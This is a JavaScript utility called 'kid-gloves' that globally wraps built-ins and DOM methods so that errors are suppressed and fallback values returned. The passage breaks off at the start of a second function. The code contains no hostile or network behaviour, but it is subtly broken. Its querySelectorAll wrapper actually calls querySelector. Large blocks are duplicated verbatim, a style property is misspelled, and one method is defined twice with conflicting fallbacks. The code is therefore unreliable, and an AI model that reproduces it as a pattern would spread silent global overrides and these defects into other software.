if (!globalThis.namespaces?.['kid-gloves']) {
  void (function KidGloves() {
    const q = (varFn) => {
      try {
        return varFn?.();
      } catch (e) {
        if (e.name != 'ReferenceError') {
          throw e;
        }
      }
    }

    const globalObject = q(() => globalThis) // works in most modern runtimes
      ?? q(() => self) // also works in most modern runtimes
      ?? q(() => global) // fallback for older nodejs
      ?? q(() => window) // fallback for older browsers
      ?? this ?? {}; // fallbacks for edge cases.
    const str = x => String(x?.description ?? x?.source ?? x);
    for (let x of ['globalThis', 'self', 'global']) {
      globalObject[x] = globalObject;
    }
    self.q = q;

    self.newQ = (...args) => {
      const fn = args?.shift?.();
      return fn && new fn(...args);
    };
    globalThis.objDoProp = function(obj, prop, def, enm, mut) {
      return Object.defineProperty(obj, prop, {
        value: def,
        writable: mut,
        enumerable: enm,
        configurable: mut,
      });
    };
    globalThis.objDefProp = (obj, prop, def) => objDoProp(obj, prop, def, false, true);
    globalThis.objDefEnum = (obj, prop, def) => objDoProp(obj, prop, def, true, true);
    globalThis.objFrzProp = (obj, prop, def) => objDoProp(obj, prop, def, false, false);
    globalThis.objFrzEnum = (obj, prop, def) => objDoProp(obj, prop, def, true, false);
    globalThis.objectNames = (x) => Object.getOwnPropertyNames(x);
    globalThis.objectSymbols = function() {
      return Object.getOwnPropertySymbols(...arguments);
    };
    globalThis.objDefProps = function objDefProps(obj, props = {}) {
      for (let prop in props) {
        objDefProp(obj, prop, props[prop]);
      }
      return obj;
    };
    globalThis.objGetProto = function() {
      return Object.getPrototypeOf(...arguments);
    };
    globalThis.objSetProto = function() {
      return Object.setPrototypeOf(...arguments);
    };

    globalThis.create = (proto) => Object.create(proto);
    function assignAll(target, src) {
      let excepts = ["prototype", "constructor", "__proto__"];
      let enums = [];
      let source = src;
      while (source) {
        for (let x in source) {
          try {
            if (excepts.includes(x)) {
              continue;
            }
            objDefEnum(target, x, source[x]);
            enums.push(x);
          } catch (e) {
            continue;
          }
        }
        for (let key of objectNames(source)) {
          try {
            if (enums.includes(key) || excepts.includes(key)) {
              continue;
            }
            objDefProp(target, key, source[key]);
          } catch {
            continue;
          }
        }
        for (let key of objectSymbols(source)) {
          try {
            if (enums.includes(key) || excepts.includes(key)) {
              continue;
            }
            objDefProp(target, key, source[key]);
          } catch {
            continue;
          }
        }
        if (source.entries && source.get && source.set) {
          try {
            for (let [key, value] of source.entries()) {
              try {
                target.set(key, value);
              } catch (e) {
                continue;
              }
            }
          } catch (e) { }
        }
        if (source.add && source.keys) {
          try {
            for (let key of source.keys()) {
              try {
                target.add(key);
              } catch {
                continue;
              }
            }
          } catch { }
        }
        source = objGetProto(source);
      }
      return target;
    }

    function shamAll(target, src) {
      //if((target ?? src)==undefined)return target;
      let excepts = ["prototype", "constructor", "__proto__"];
      let enums = [];
      let source = src;
      while (source) {
        for (let x in source) {
          try {
            if (excepts.includes(x) || enums.includes(x)) {
              continue;
            }
            (() => {
              const $source = source;
              if (typeof $source[x] == 'function') {
                objDefEnum(target, x, function() {
                  try {
                    return $source[x](...arguments);
                  } catch (e) {
                    console.warn(e, this, ...arguments);
                  }
                });
              } else {
                Object.defineProperty(target, x, {
                  get() {
                    try {
                      return $source[x];
                    } catch (e) {
                      console.warn(e, this, ...arguments);
                    }
                  },
                  set(value) {
                    try {
                      $source[x] = value;
                    } catch (e) {
                      console.warn(e, this, ...arguments);
                    }
                  },
                  enumerable: true,
                  configurable: true,
                });
              }
            })();
            enums.push(x);
          } catch (e) {
            continue;
          }
        }
        let props = [];
        for (let key of objectNames(source)) {
          try {
            if (enums.includes(key) || excepts.includes(key) || props.includes(key)) {
              continue;
            }
            (() => {
              const $source = source;
              if (typeof $source[key] == 'function') {
                objDefProp(target, key, function() {
                  try {
                    return $source[key](...arguments);
                  } catch (e) {
                    console.warn(e, this, ...arguments);
                  }
                });
              } else {
                Object.defineProperty(target, key, {
                  get() {
                    try {
                      return $source[key];
                    } catch (e) {
                      console.warn(e, this, ...arguments);
                    }
                  },
                  set(value) {
                    try {
                      $source[key] = value;
                    } catch (e) {
                      console.warn(e, this, ...arguments);
                    }
                  },
                  enumerable: false,
                  configurable: true,
                });
              }
            })();
          } catch {
            continue;
          }
          props.push(key);
        }
        for (let key of objectSymbols(source)) {
          try {
            if (enums.includes(key) || excepts.includes(key) || props.includes(key)) {
              continue;
            }
            (() => {
              const $source = source;
              if (typeof $source[key] == 'function') {
                objDefProp(target, key, function() {
                  try {
                    return $source[key](...arguments);
                  } catch (e) {
                    console.warn(e, this, ...arguments);
                  }
                });
              } else {
                Object.defineProperty(target, key, {
                  get() {
                    try {
                      return $source[key];
                    } catch (e) {
                      console.warn(e, this, ...arguments);
                    }
                  },
                  set(value) {
                    try {
                      $source[key] = value;
                    } catch (e) {
                      console.warn(e, this, ...arguments);
                    }
                  },
                  enumerable: false,
                  configurable: true,
                });
              }
            })();
          } catch {
            continue;
          }
          props.push(key);
        }
        source = objGetProto(source);
      }
      return target;
    }

    function assignProto(target, src) {
      const proto = src?.prototype ?? Object(src);
      try {
        objDefProp(target, 'prototype', proto);
      } catch {
        try {
          target.prototype = proto;
        } catch { }
        if (target.prototype != proto) {
          assignAll(target.prototype, proto);
        }
      }
    }
    Object.defineProperty(globalThis, "arguments", {
      get() {
        try {
          throw new Error('Attempting to retrieve arguments in the wrong context');
        } catch (e) {
          console.warn(e);
        }
        return (function args() { return arguments })();
      },
      set(newValue) {
        try {
          throw new Error('Attempting to set arguments in the wrong context');
        } catch (e) {
          console.warn(e);
        }
      },
      enumerable: false,
      configurable: true,
    });

    Object.defineProperty(globalThis, "of", {
      get() {
        try {
          throw new Error('Attempting to call "of" in the wrong context');
        } catch (e) {
          console.warn(e);
        }
        return _ => _;
      },
      set(newValue) {
      },
      enumerable: false,
      configurable: true,
    });

    Object.defineProperty(globalThis, "from", {
      get() {
        try {
          throw new Error('Attempting to call "from" in the wrong context');
        } catch (e) {
          console.warn(e);
        }
        return _ => _;
      },
      set(newValue) {
      },
      enumerable: false,
      configurable: true,
    });
    const Extends = (thisClass, superClass) => {
        try {
            Object.setPrototypeOf(thisClass, superClass);
            Object.setPrototypeOf(
                thisClass.prototype,
                superClass?.prototype ??
                superClass?.constructor?.prototype ??
                superClass
            );
        } catch (e) {
            console.warn(e, {
                thisClass,
                superClass
            });
        }
        return thisClass;
    };
    
     (() => {
        const _BigInt = globalThis.BigInt;
        (() => {
            globalThis.BigInt = Extends(function BigInt(...args) {
                if (new.target) {
                    try {
                        return Reflect.construct(_BigInt, args, new.target);
                    } catch (e) {
                        console.warn(e, ...args);
                    }
                }
                try {
                    return _BigInt(...args);
                } catch (e) {
                    console.warn(e, ...args);
                    return 0n;
                }
            }, _BigInt);
        })();
    })();

  (() => {
        const _Symbol = globalThis.Symbol;
        (() => {
            globalThis.Symbol = Extends(function Symbol(...args) {
                if (new.target) {
                    try {
                        return Reflect.construct(_Symbol, args, new.target);
                    } catch (e) {
                        console.warn(e, ...args);
                    }
                }
                try {
                    return _Symbol(...args);
                } catch (e) {
                    console.warn(e, ...args);
                    return Object.create(_Symbol.prototype);
                }
            }, _Symbol);
        })();
    })();



    if (globalThis.Promise && !globalThis['&Promise']) {
      objDefProp(globalThis, '&Promise', Promise);
      globalThis.Promise = function Promise() {
        const promise = new globalThis['&Promise'](...arguments);
        if (new.target) {
          objDefProp(this, 'toString', function toString() { return promise.toString(...arguments); });
          objDefProp(this, 'valueOf', function valueOf() { return promise; });
          objDefProp(this, 'toLocaleString', function toLocaleString() { return promise.toLocaleString(...arguments); });
          objDefProp(this, Symbol.toPrimitive, function toPrimitive() { return promise; });
          objDefProp(this, Symbol.toStringTag, function toStringTag() { return promise.toString(); });
          Object.setPrototypeOf(this, globalThis['&Promise'].prototype);
        } else {
          try {
            throw new Error('Using Promise without new is not recommended, use new Promise() instead');
          } catch (e) {
            console.warn(e, this, new.target, ...arguments);
          }
        }
        return promise;
      }
      assignProto(Promise, globalThis['&Promise']);
      Object.setPrototypeOf(Promise, globalThis['&Promise']);
    }

(() => {
        const _RegExp = globalThis.RegExp;
        (() => {
            globalThis.RegExp = Extends(function RegExp(...args) {
                if (new.target) {
                    try {
                        return Reflect.construct(_RegExp, args, new.target);
                    } catch (e) {
                        console.warn(e, ...args);
                        return Reflect.construct(_RegExp, [/$RegExp^/], new.target);
                    }
                }
                try {
                    return _RegExp(...args);
                } catch (e) {
                    console.warn(e, ...args);
                    return _RegExp(/$RegExp^/);
                }
            }, _RegExp);
        })();
    })();

    (()=>{
      const _get = Map.prototype.get;
      objDefProp(Map.prototype, 'get', function get(key) {
        try {
          return _get.call(this,key);
        } catch (e) {
          console.warn(e,key);
        }
      });
    })();

    function emptyNodeList() {
      return document?.createDocumentFragment?.()?.querySelectorAll?.('*') ?? [];
    }
    function Null() {
      const nul = document.createElement('null');
      nul.style.display = 'none';
      nul.style.visibility = 'hidden';
      nul.style.opactiy = 0;
      const all = newQ(Document)?.all ?? Object(false);
      return shamAll(all, nul);
    }

    function makeNodes(nodeType) {

       (()=>{
        const _querySelector = globalThis[nodeType]?.prototype?.querySelector;
        if(!_querySelector)return;
        objDefEnum(globalThis[nodeType].prototype, 'querySelector', Extends(function querySelector(...args) {
          try {
            return _querySelector.apply(this,args);
          } catch (e) {
            console.warn(e, this, ...args);
            try {
              return _querySelector.apply(this,args.map(x => str(x)));
            } catch (e) {
              console.warn(e);
              return Null();
            }
          }
        },_querySelector));
      })();
      
      (()=>{
        const _querySelectorAll = globalThis[nodeType]?.prototype?.querySelector;
        if(!_querySelectorAll)return;
        objDefEnum(globalThis[nodeType].prototype, 'querySelectorAll', Extends(function querySelectorAll(...args) {
          try {
            return _querySelectorAll.apply(this,args);
          } catch (e) {
            console.warn(e, this, ...args);
            try {
              return _querySelectorAll.apply(this,args.map(x => str(x)));
            } catch (e) {
              console.warn(e);
              return emptyNodeList();
            }
          }
        },_querySelectorAll));
      })();
        
      if (globalThis[nodeType]?.prototype?.getElementById && !globalThis[nodeType]?.prototype?.['&getElementById']) {
        objDefProp(globalThis[nodeType].prototype, '&getElementById', globalThis[nodeType].prototype.getElementById);
        objDefEnum(globalThis[nodeType].prototype, 'getElementById', function getElementById() {
          try {
            return this['&getElementById'](...arguments) ?? Null();
          } catch (e) {
            console.warn(e);
            try {
              return this['&getElementById'](...[...arguments].map(x => str(x))) ?? Null();
            } catch (e) {
              console.warn(e);
              return Null();
            }
          }
        });
      }

      if (globalThis[nodeType]?.prototype?.getElementById && !globalThis[nodeType]?.prototype?.getElementsById) {
        objDefProp(globalThis[nodeType].prototype, 'getElementsById', function getElementsById(query) {
          console.warn('getElementsById is not supported. Did you mean getElementById?');
          try {
            return this?.querySelectorAll?.(`[id="${str(query)}"]`);
          } catch (e) {
            console.warn(e);
            return emptyNodeList();
          }
        });
      }
      if (globalThis[nodeType]?.prototype?.getElementsByTagName && !globalThis[nodeType]?.prototype?.['&getElementsByTagName']) {

        objDefProp(globalThis[nodeType].prototype, '&getElementsByTagName', globalThis[nodeType].prototype.getElementsByTagName);
        objDefEnum(globalThis[nodeType].prototype, 'getElementsByTagName', function getElementsByTagName() {
          try {
            return this['&getElementsByTagName'](...arguments);
          } catch (e) {
            console.warn(e);
            try {
              return this['&getElementsByTagName'](...[...arguments].map(x => str(x)));
            } catch (e) {
              console.warn(e);
              return this['&getElementsByTagName']?.('<>') ?? [];
            }
          }
        });
        objDefProp(globalThis[nodeType].prototype, 'getElementByTagName', function getElementByTagName(query) {
          console.warn('getElementByTagName is not supported. Did you mean getElementsByTagName?');
          return this.getElementsByTagName?.(query)?.[0] ?? this.querySelector(query) ?? Null();
        });


      }



      if (globalThis[nodeType]?.prototype?.getElementsByClassName && !globalThis[nodeType]?.prototype?.['&getElementsByClassName']) {
        objDefProp(globalThis[nodeType].prototype, '&getElementsByClassName', globalThis[nodeType].prototype.getElementsByClassName);
        objDefEnum(globalThis[nodeType].prototype, 'getElementsByClassName', function getElementsByClassName() {
          try {
            return this['&getElementsByClassName'](...arguments);
          } catch (e) {
            console.warn(e);
            try {
              return this['&getElementsByClassName'](...[...arguments].map(x => str(x)));
            } catch (e) {
              console.warn(e);
              return this['&getElementsByTagName']?.('<>') ?? [];
            }
          }
        });
        objDefProp(globalThis[nodeType].prototype, 'getElementByClassName', function getElementByClassName(query) {
          console.warn('getElementByClassName is not supported. Did you mean getElementsByClassName?');
          return this.getElementsByClassName?.(query)?.[0] ?? this.querySelector(`.${query}`) ?? Null();
        });


      }



      if (globalThis[nodeType]?.prototype?.getElementsByTagNameNS && !globalThis[nodeType]?.prototype?.['&getElementsByTagNameNS']) {
        objDefProp(globalThis[nodeType].prototype, '&getElementsByTagNameNS', globalThis[nodeType].prototype.getElementsByTagNameNS);
        objDefEnum(globalThis[nodeType].prototype, 'getElementsByTagNameNS', function getElementsByTagNameNS() {
          try {
            return this['&getElementsByTagNameNS'](...arguments);
          } catch (e) {
            console.warn(e);
            try {
              return this['&getElementsByTagNameNS'](...[...arguments].map(x => str(x)));
            } catch (e) {
              console.warn(e);
              return this['&getElementsByTagNameNS']?.('<>')[0] ?? [];
            }
          }
        });

        objDefProp(globalThis[nodeType].prototype, 'getElementByTagNameNS', function getElementByTagNameNS(query) {
          console.warn('getElementByTagNameNS is not supported. Did you mean getElementsByTagNameNS?');
          return this.getElementsByTagNameNS?.(query)?.[0] ?? Null();
        });
      }

      if (globalThis[nodeType]?.prototype?.getElementsByName && !globalThis[nodeType]?.prototype?.['&getElementsByName']) {
        objDefProp(globalThis[nodeType].prototype, '&getElementsByName', globalThis[nodeType].prototype.getElementsByName);
        objDefEnum(globalThis[nodeType].prototype, 'getElementsByName', function getElementsByName() {
          try {
            return this['&getElementsByName'](...arguments);
          } catch (e) {
            console.warn(e);
            try {
              return this['&getElementsByName'](...[...arguments].map(x => str(x)));
            } catch (e) {
              console.warn(e);
              return this['&getElementsByTagName']?.('<>') ?? [];
            }
          }
        });
      }
      if (globalThis[nodeType]?.prototype?.createElement && !globalThis[nodeType]?.prototype?.['&createElement']) {
        objDefProp(globalThis[nodeType].prototype, '&createElement', globalThis[nodeType].prototype.createElement);
        objDefEnum(globalThis[nodeType].prototype, 'createElement', function createElement() {
          try {
            return this['&createElement'](...arguments);
          } catch (e) {
            console.warn(e, ...arguments);
            return this['&createElement'](e?.name ?? 'Error');
          }
        });
      }
      objDefProp(globalThis[nodeType].prototype, 'getElementByName', function getElementByName(query) {
        console.warn('getElementByName is not supported. Did you mean getElementsByName?');
        return this.getElementsByName?.(query)?.[0] ?? null;
      });





      if (globalThis[nodeType]?.prototype?.createElementNS && !globalThis[nodeType]?.prototype?.['&createElementNS']) {
        objDefProp(globalThis[nodeType].prototype, '&createElementNS', globalThis[nodeType].prototype.createElementNS);
        objDefEnum(globalThis[nodeType].prototype, 'createElementNS', function createElementNS() {
          try {
            return this['&createElementNS'](...arguments);
          } catch (e) {
            try {
              console.warn(e, ...arguments);
              return this['&createElement'](...arguments);
            } catch (e) {
              console.warn(e, ...arguments);
              return this['&createElement'](e?.name ?? 'Error');
            }
          }
        });
      }
      objDefProp(globalThis[nodeType].prototype, 'getElementByName', function getElementByName(query) {
        console.warn('getElementByName is not supported. Did you mean getElementsByName?');
        return this.getElementsByName?.(query)?.[0] ?? Null();
      });


    }
    makeNodes('XMLDocument');
    makeNodes('HTMLDocument');
    makeNodes('Document');
    makeNodes('Element');
    makeNodes('DocumentFragment');
    objDefProp(globalThis.window ?? {}, '&querySelectorAll', function querySelectorAll() {
      return document.querySelectorAll(...arguments);
    });

    if (Object.freeze && !Object['&freeze']) {
      objDefProp(Object, '&freeze', Object.freeze);
      objDefProp(Object, 'freeze', function freeze(obj) {
        try {
          return Object['&freeze'](obj);
        } catch (e) {
          console.warn(e);
          try {
            return Object['&freeze'](Object(obj));
          } catch (e) {
            console.warn(e);
            return obj;
          }
        }
      });
    }

    if (Object.seal && !Object['&seal']) {
      objDefProp(Object, '&seal', Object.seal);
      objDefProp(Object, 'seal', function seal(obj) {
        try {
          return Object['&seal'](obj);
        } catch (e) {
          console.warn(e);
          try {
            return Object['&seal'](Object(obj));
          } catch (e) {
            console.warn(e);
            return obj;
          }
        }
      });
    }

    if (Object.preventExtensions && !Object['&preventExtensions']) {
      objDefProp(Object, '&preventExtensions', Object.preventExtensions);
      objDefProp(Object, 'preventExtensions', function preventExtensions(obj) {
        try {
          return Object['&preventExtensions'](obj);
        } catch (e) {
          console.warn(e);
          try {
            return Object['&preventExtensions'](Object(obj));
          } catch (e) {
            console.warn(e);
            return obj;
          }
        }
      });
    }
    if (Object.create && !Object['&create']) {
      objDefProp(Object, '&create', Object.create);
      objDefProp(Object, 'create', function create(proto, props) {
        try {
          return Object['&create'](proto, props);
        } catch (e) {
          console.warn(e);
          try {
            return Object['&create'](Object(proto), props);
          } catch (e) {
            console.warn(e);
            return Object['&create'](null, props);
          }
        }
      });
    }
    if (globalThis.parseFloat && !globalThis['&parseFloat']) {
      objDefProp(globalThis, '&parseFloat', globalThis.parseFloat);
      objDefProp(globalThis, 'parseFloat', function parseFloat(s) {
        try {
          return globalThis['&parseFloat'](s);
        } catch (e) {
          console.warn(e);
          try {
            return globalThis['&parseFloat'](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    }

    if (globalThis.parseInt && !globalThis['&parseInt']) {
      objDefProp(globalThis, '&parseInt', globalThis.parseInt);
      objDefProp(globalThis, 'parseInt', function parseInt(s) {
        try {
          return globalThis['&parseInt'](s);
        } catch (e) {
          console.warn(e);
          try {
            return globalThis['&parseInt'](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    }

    if (Number.parseFloat && !Number['&parseFloat']) {
      objDefProp(Number, '&parseFloat', Number.parseFloat);
      objDefProp(Number, 'parseFloat', function parseFloat(s) {
        try {
          return Number['&parseFloat'](s);
        } catch (e) {
          console.warn(e);
          try {
            return Number['&parseFloat'](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    }

    if (Number.parseInt && !Number['&parseInt']) {
      objDefProp(Number, '&parseInt', Number.parseInt);
      objDefProp(Number, 'parseInt', function parseInt(s) {
        try {
          return Number['&parseInt'](s);
        } catch (e) {
          console.warn(e);
          try {
            return Number['&parseInt'](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    }
    if (globalThis.document?.write && !globalThis.document?.['&write']) {
      objDefProp(document, '&write', document.write);
      objDefProp(document, 'write', function write(s) {
        try {
          return document['&write'](s);
        } catch (e) {
          console.warn(e);
          try {
            return document['&write'](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    }

    if (globalThis?.EventTarget?.prototype?.addEventListener && !globalThis?.EventTarget?.prototype?.['&addEventListener']) {
      objDefProp(EventTarget.prototype, '&addEventListener', EventTarget.prototype.addEventListener);
      objDefProp(EventTarget.prototype, 'addEventListener', function addEventListener(s) {
        try {
          return this['&addEventListener'](...arguments);
        } catch (e) {
          console.warn(e);
          try {
            const args = [...arguments];
            args[0] = str(args[0]);
            return this['&addEventListener'](...args);
          } catch (e) {
            console.warn(e);
            try {
              const args = [...arguments];
              args[0] = str(args[0]);
              args[1] = () => (args[1]?.call?.(this, ...arguments) ?? Object(args[1]));
              return this['&addEventListener'](...args);
            } catch (e) {
              return console.warn(e);
            }
          }
        }
      });
    } if (Object.freeze && !Object['&freeze']) {
      objDefProp(Object, '&freeze', Object.freeze);
      objDefProp(Object, 'freeze', function freeze(obj) {
        try {
          return Object['&freeze'](obj);
        } catch (e) {
          console.warn(e);
          try {
            return Object['&freeze'](Object(obj));
          } catch (e) {
            console.warn(e);
            return obj;
          }
        }
      });
    }

    if (Object.seal && !Object['&seal']) {
      objDefProp(Object, '&seal', Object.seal);
      objDefProp(Object, 'seal', function seal(obj) {
        try {
          return Object['&seal'](obj);
        } catch (e) {
          console.warn(e);
          try {
            return Object['&seal'](Object(obj));
          } catch (e) {
            console.warn(e);
            return obj;
          }
        }
      });
    }

    if (Object.preventExtensions && !Object['&preventExtensions']) {
      objDefProp(Object, '&preventExtensions', Object.preventExtensions);
      objDefProp(Object, 'preventExtensions', function preventExtensions(obj) {
        try {
          return Object['&preventExtensions'](obj);
        } catch (e) {
          console.warn(e);
          try {
            return Object['&preventExtensions'](Object(obj));
          } catch (e) {
            console.warn(e);
            return obj;
          }
        }
      });
    }
    if (Object.create && !Object['&create']) {
      objDefProp(Object, '&create', Object.create);
      objDefProp(Object, 'create', function create(proto, props) {
        try {
          return Object['&create'](proto, props);
        } catch (e) {
          console.warn(e);
          try {
            return Object['&create'](Object(proto), props);
          } catch (e) {
            console.warn(e);
            return Object['&create'](null, props);
          }
        }
      });
    }
    if (globalThis.parseFloat && !globalThis['&parseFloat']) {
      objDefProp(globalThis, '&parseFloat', globalThis.parseFloat);
      objDefProp(globalThis, 'parseFloat', function parseFloat(s) {
        try {
          return globalThis['&parseFloat'](s);
        } catch (e) {
          console.warn(e);
          try {
            return globalThis['&parseFloat'](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    }
    (() => {
      const $isNaN = globalThis.isNaN;
      objDefProp(globalThis, 'isNaN', function isNaN(s) {
        try {
          return $isNaN(s);
        } catch (e) {
          console.warn(e);
          try {
            return $isNaN(str(s));
          } catch (e) {
            console.warn(e);
            return false;
          }
        }
      });
    })();
    (() => {
      const $parseInt = globalThis.parseInt;
      objDefProp(globalThis, 'parseInt', function parseInt(s) {
        try {
          return $parseInt(s);
        } catch (e) {
          console.warn(e);
          try {
            return $parseInt(str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    })();
    (() => {
      const $parseFloat = Symbol('parseFloat');
      objDefProp(Number, $parseFloat, Number.parseFloat);
      objDefProp(Number, 'parseFloat', function parseFloat(s) {
        try {
          return Number[$parseFloat](s);
        } catch (e) {
          console.warn(e);
          try {
            return Number[$parseFloat](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    })();
    if (Number.parseInt && !Number['&parseInt']) {
      objDefProp(Number, '&parseInt', Number.parseInt);
      objDefProp(Number, 'parseInt', function parseInt(s) {
        try {
          return Number['&parseInt'](s);
        } catch (e) {
          console.warn(e);
          try {
            return Number['&parseInt'](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    }
    if (globalThis?.document?.write && !globalThis?.document?.['&write']) {
      objDefProp(document, '&write', document.write);
      objDefProp(document, 'write', function write(s) {
        try {
          return document['&write'](s);
        } catch (e) {
          console.warn(e);
          try {
            return document['&write'](str(s));
          } catch (e) {
            console.warn(e);
            return NaN;
          }
        }
      });
    }

    if (globalThis?.EventTarget?.prototype?.addEventListener && !globalThis?.EventTarget?.prototype?.['&addEventListener']) {
      objDefProp(EventTarget.prototype, '&addEventListener', EventTarget.prototype.addEventListener);
      objDefProp(EventTarget.prototype, 'addEventListener', function addEventListener() {
        try {
          return this['&addEventListener'](...arguments);
        } catch (e) {
          console.warn(e);
          try {
            const args = [...arguments];
            args[0] = str(args[0]);
            return this['&addEventListener'](...args);
          } catch (e) {
            console.warn(e);
            try {
              const args = [...arguments];
              args[0] = str(args[0]);
              args[1] = () => args[1]?.();
              return this['&addEventListener'](...args);
            } catch (e) {
              return console.warn(e);
            }
          }
        }
      });
    }

    if (globalThis.Object.getPrototypeOf && !globalThis.Object['&getPrototypeOf']) {
      objDefProp(globalThis.Object, '&getPrototypeOf', globalThis.Object.getPrototypeOf);
      objDefProp(globalThis.Object, 'getPrototypeOf', function getPrototypeOf(obj) {
        try {
          return globalThis.Object['&getPrototypeOf'](obj);
        } catch (e) {
          console.warn(e);
          return globalThis.Object['&getPrototypeOf'](Object(obj));
        }
      });
    }

    if (globalThis.Node?.prototype?.removeChild && !globalThis.Node?.prototype?.['&removeChild']) {
      objDefProp(globalThis.Node.prototype, '&removeChild', globalThis.Node.prototype.removeChild);
      objDefEnum(globalThis.Node.prototype, 'removeChild', function removeChild(child) {
        try {
          this['&removeChild'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
          try {
            child?.remove?.();
          } catch (e) {
            console.warn(e, this, ...arguments);
          }
        }
        return child ?? document.createElement(String(child));
      });
    }

    if (globalThis.Node?.prototype?.appendChild && !globalThis.Node?.prototype?.['&appendChild']) {
      objDefProp(globalThis.Node.prototype, '&appendChild', globalThis.Node.prototype.appendChild);
      objDefEnum(globalThis.Node.prototype, 'appendChild', function appendChild(child) {
        try {
          this['&appendChild'](child);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Node?.prototype?.replaceChild && !globalThis.Node?.prototype?.['&replaceChild']) {
      objDefProp(globalThis.Node.prototype, '&replaceChild', globalThis.Node.prototype.replaceChild);
      objDefEnum(globalThis.Node.prototype, 'replaceChild', function replaceChild(child) {
        try {
          this['&replaceChild'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Node?.prototype?.insertBefore && !globalThis.Node?.prototype?.['&insertBefore']) {
      objDefProp(globalThis.Node.prototype, '&insertBefore', globalThis.Node.prototype.insertBefore);
      objDefEnum(globalThis.Node.prototype, 'insertBefore', function insertBefore(child) {
        try {
          this['&insertBefore'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.append && !globalThis.Element?.prototype?.['&append']) {
      objDefProp(globalThis.Element.prototype, '&append', globalThis.Element.prototype.append);
      objDefEnum(globalThis.Element.prototype, 'append', function append(child) {
        try {
          this['&append'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.before && !globalThis.Element?.prototype?.['&before']) {
      objDefProp(globalThis.Element.prototype, '&before', globalThis.Element.prototype.before);
      objDefEnum(globalThis.Element.prototype, 'before', function before(child) {
        try {
          this['&before'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.after && !globalThis.Element?.prototype?.['&after']) {
      objDefProp(globalThis.Element.prototype, '&after', globalThis.Element.prototype.after);
      objDefEnum(globalThis.Element.prototype, 'after', function after(child) {
        try {
          this['&after'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.prepend && !globalThis.Element?.prototype?.['&prepend']) {
      objDefProp(globalThis.Element.prototype, '&prepend', globalThis.Element.prototype.prepend);
      objDefEnum(globalThis.Element.prototype, 'prepend', function prepend(child) {
        try {
          this['&prepend'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.insertAdjacentElement && !globalThis.Element?.prototype?.['&insertAdjacentElement']) {
      objDefProp(globalThis.Element.prototype, '&insertAdjacentElement', globalThis.Element.prototype.insertAdjacentElement);
      objDefEnum(globalThis.Element.prototype, 'insertAdjacentElement', function insertAdjacentElement(child) {
        try {
          this['&insertAdjacentElement'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.insertAdjacentHTML && !globalThis.Element?.prototype?.['&insertAdjacentHTML']) {
      objDefProp(globalThis.Element.prototype, '&insertAdjacentHTML', globalThis.Element.prototype.insertAdjacentHTML);
      objDefEnum(globalThis.Element.prototype, 'insertAdjacentHTML', function insertAdjacentHTML(child) {
        try {
          this['&insertAdjacentHTML'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.insertAdjacentText && !globalThis.Element?.prototype?.['&insertAdjacentText']) {
      objDefProp(globalThis.Element.prototype, '&insertAdjacentText', globalThis.Element.prototype.insertAdjacentText);
      objDefEnum(globalThis.Element.prototype, 'insertAdjacentText', function insertAdjacentText(child) {
        try {
          this['&insertAdjacentText'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.remove && !globalThis.Element?.prototype?.['&remove']) {
      objDefProp(globalThis.Element.prototype, '&remove', globalThis.Element.prototype.remove);
      objDefEnum(globalThis.Element.prototype, 'remove', function remove(child) {
        try {
          this['&remove'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.replaceChildren && !globalThis.Element?.prototype?.['&replaceChildren']) {
      objDefProp(globalThis.Element.prototype, '&replaceChildren', globalThis.Element.prototype.replaceChildren);
      objDefEnum(globalThis.Element.prototype, 'replaceChildren', function replaceChildren(child) {
        try {
          this['&replaceChildren'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }
    if (globalThis.Element?.prototype?.replaceWith && !globalThis.Element?.prototype?.['&replaceWith']) {
      objDefProp(globalThis.Element.prototype, '&replaceWith', globalThis.Element.prototype.replaceWith);
      objDefEnum(globalThis.Element.prototype, 'replaceWith', function replaceWith(child) {
        try {
          this['&replaceWith'](...arguments);
        } catch (e) {
          console.warn(e, this, ...arguments);
        }
        return child ?? document.createElement(String(child));
      });
    }


    globalThis.namespaces ??= {};
    globalThis.namespaces['kid-gloves'] ||= Object(true);

  })();

}

(() => {
  const parse = (x) => {
    try {
      return JSON.parse(x);
    } catch {
      return x;
    }
  };
  const document = self.window?.top?.document ?? self.document ?? {};
